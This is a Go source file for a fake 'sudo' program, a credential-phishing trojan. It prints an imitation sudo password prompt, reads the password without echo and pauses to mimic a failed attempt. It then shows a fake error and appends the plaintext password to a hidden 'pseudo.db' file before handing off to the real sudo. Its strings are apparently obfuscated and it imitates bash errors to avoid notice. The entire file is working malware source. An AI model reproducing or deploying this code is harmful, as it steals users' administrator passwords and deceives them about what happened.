//go:generate ./gen-base64-strings.sh
package main

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path"
	"syscall"
	"time"

	tty "github.com/mattn/go-tty"
)

const (
	dbName = "pseudo.db"
)

var (
	ErrFindDB = errors.New("Failed to locate pseudo database")
)

func findDB() (string, error) {
	user, err := user.Current()
	if err != nil {
		return "", ErrFindDB
	}

	paths :=
		[...]string{
			// linux
			user.HomeDir + "/.local/share/" + dbName,
			// osx or other
			user.HomeDir + "/." + dbName,
		}

	for _, p := range paths {
		if s, err := os.Stat(path.Dir(p)); err == nil && s.IsDir() {
			return p, nil
		}
	}
	return "", ErrFindDB
}

func grabPassword() {
	tty, _ := tty.Open()
	defer tty.Close()
	out := tty.Output()
	defer out.Close()

	fmt.Fprintf(out, "[%s] %s for %s: ", strSudo.String(), strPassword.String(), os.Getenv("USER"))
	pass, _ := tty.ReadPasswordNoEcho()
	time.Sleep(2 * time.Second) // authentic backoff time
	fmt.Fprintln(out, strSudoErrorMessage.String())

	path, _ := findDB()
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0650)
	defer f.Close()
	fmt.Fprintln(f, pass)
}

func main() {
	sudoPath, err := exec.LookPath(strSudo.String())
	if err != nil {
		// act like we are bash
		fmt.Fprintf(os.Stderr, "%s\n", strBashError.String())
		os.Exit(127)
	}

	grabPassword()

	// Switch to real sudo
	args := append([]string{strSudo.String(), "-k"}, os.Args[1:]...)
	syscall.Exec(sudoPath, args, os.Environ())
}
